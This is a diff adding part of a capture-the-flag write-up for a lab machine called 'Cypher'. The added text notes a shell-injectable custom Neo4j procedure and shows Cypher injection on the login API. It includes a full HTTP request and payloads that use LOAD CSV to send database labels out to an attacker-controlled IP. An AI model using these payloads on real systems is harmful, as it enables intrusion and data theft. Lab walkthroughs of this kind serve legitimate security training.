@@ -139,10 +139,42 @@ I used online Java decompiler to decompile and inspect individual files. Looking
 There is a custom function/procedure called **"custom.getUrlStatusCode"** that sends an HTTP request to a specified URL and returns the corresponding HTTP status code. It utilizes **"curl"** for the request, which is executed via **"/bin/sh"**, potentially introducing a security risk.  
 
 Moreover, the **"url"** parameter is directly appended to the shell command without any validation, making remote code execution (RCE) possible.
+
 ![Pwned3 Screen](.images/6.jpg)
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+Testing the login page with a single quote (') returns a Neo4j error message, confirming Cypher injection.
 
+![Pwned3 Screen](.images/7.jpg)
 
+Using Cypher injection, we extract database details:
+```bash
+POST /api/auth HTTP/1.1
+Host: cypher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+Content-Length: 261
+Origin: http://cypher.htb
+Connection: keep-alive
+Referer: http://cypher.htb/login
+Priority: u=0
+
+{"username":"' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.9:9000/?'+label AS b RETURN b//","password":"admin"}
+```
+Results show that Neo4j 5.24.1 (Community Edition) is in use.
+
+Next, we enumerate labels (equivalent to tables in SQL):
+```bash
+' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.144:9000/?'+label AS b RETURN b//
+```
+
+Finds an interesting label: USER.
+
+We then extract credentials:
 
 
 
